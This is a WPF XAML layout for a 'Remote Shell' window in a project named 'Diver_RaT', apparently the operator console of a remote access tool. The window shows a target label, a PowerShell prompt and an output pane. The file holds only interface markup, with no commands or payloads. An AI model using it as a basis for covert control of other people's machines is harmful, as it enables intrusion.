<Window x:Class="Diver_RaT.ShellWindow"
        xmlns="http://schemas.microsoft.com/winfx/2006/xaml/presentation"
        xmlns:x="http://schemas.microsoft.com/winfx/2006/xaml"
        xmlns:d="http://schemas.microsoft.com/expression/blend/2008"
        xmlns:mc="http://schemas.openxmlformats.org/markup-compatibility/2006"
        mc:Ignorable="d"
        xmlns:shell="clr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        xmlns:ui="clr-namespace:Diver_RaT"
        WindowStyle="None"
        ResizeMode="CanResize"
        Title="Remote Shell" Height="620" Width="860"
        WindowStartupLocation="CenterOwner"
        Background="{StaticResource WindowBgBrush}"
        Foreground="#E6E8EF">

    <WindowChrome.WindowChrome>
        <WindowChrome CaptionHeight="0" GlassFrameThickness="1" ResizeBorderThickness="6"
                      CornerRadius="8" UseAeroCaptionButtons="False"/>
    </WindowChrome.WindowChrome>

    <Grid>
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
        </Grid.RowDefinitions>
        <ui:CustomTitleBar Grid.Row="0" Title="Remote Shell"/>
        <Grid Grid.Row="1" Margin="16">
        <Grid.RowDefinitions>
            <RowDefinition Height="Auto"/>
            <RowDefinition Height="*"/>
            <RowDefinition Height="Auto"/>
        </Grid.RowDefinitions>

        <StackPanel Grid.Row="0" Orientation="Horizontal" Margin="0,0,0,10">
            <Border Width="12" Height="12" CornerRadius="3" Background="{StaticResource LimeBrush}" VerticalAlignment="Center" Margin="0,0,8,0"/>
            <TextBlock Text="REMOTE SHELL" FontSize="15" FontWeight="Bold" Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
            <TextBlock x:Name="TargetText" FontSize="13" Foreground="{StaticResource MutedBrush}" Margin="10,2,0,0" VerticalAlignment="Center"/>
            <Border Background="#111623" CornerRadius="4" Padding="8,3" Margin="10,0,0,0" VerticalAlignment="Center">
                <TextBlock Text="PowerShell" FontSize="11" FontWeight="SemiBold" Foreground="#8AA7FF"/>
            </Border>
        </StackPanel>

        <Border Grid.Row="1" Background="#0C0E12" CornerRadius="8"
                BorderBrush="#232A38" BorderThickness="1">
            <Grid>
                <Grid.RowDefinitions>
                    <RowDefinition Height="*"/>
                    <RowDefinition Height="Auto"/>
                </Grid.RowDefinitions>

                <RichTextBox x:Name="OutputBox" IsReadOnly="True" BorderThickness="0"
                             FontFamily="Cascadia Mono, Consolas" FontSize="13" Padding="14,12"
                             VerticalScrollBarVisibility="Auto" HorizontalScrollBarVisibility="Auto"
                             Background="Transparent" Foreground="#E6E8EF" SelectionBrush="#26324C"
                             IsDocumentEnabled="True">
                    <RichTextBox.Resources>
                        <Style TargetType="Paragraph">
                            <Setter Property="Margin" Value="0"/>
                            <Setter Property="Padding" Value="0"/>
                        </Style>
                    </RichTextBox.Resources>
                </RichTextBox>

                <Border Grid.Row="1" Background="#0F1319" BorderBrush="#232A38" BorderThickness="0,1,0,0"
                        Padding="14,9">
                    <Grid>
                        <Grid.ColumnDefinitions>
                            <ColumnDefinition Width="Auto"/>
                            <ColumnDefinition Width="*"/>
                        </Grid.ColumnDefinitions>
                        <TextBlock Text="PS C:\&gt;" FontFamily="Cascadia Mono, Consolas" FontSize="13"
                                   Foreground="{StaticResource LimeBrush}" VerticalAlignment="Center"/>
                        <TextBox x:Name="InputBox" Grid.Column="1" Margin="10,0,0,0" BorderThickness="0"
                                 Background="Transparent" Foreground="#E6E8EF"
                                 FontFamily="Cascadia Mono, Consolas" FontSize="13"
                                 VerticalContentAlignment="Center" CaretBrush="{StaticResource LimeBrush}"
                                 SelectionBrush="#26324C" KeyDown="InputBox_KeyDown"/>
                    </Grid>
                </Border>
            </Grid>
        </Border>

        <TextBlock x:Name="StatusText" Grid.Row="2" Margin="2,8,0,0" FontSize="12"
                   Foreground="{StaticResource MutedBrush}"/>
        </Grid>
        <Border CornerRadius="8" BorderBrush="{StaticResource WindowFrameBrush}" BorderThickness="2"
                Panel.ZIndex="9999" Grid.RowSpan="2" IsHitTestVisible="False"/>
    </Grid>
</Window>
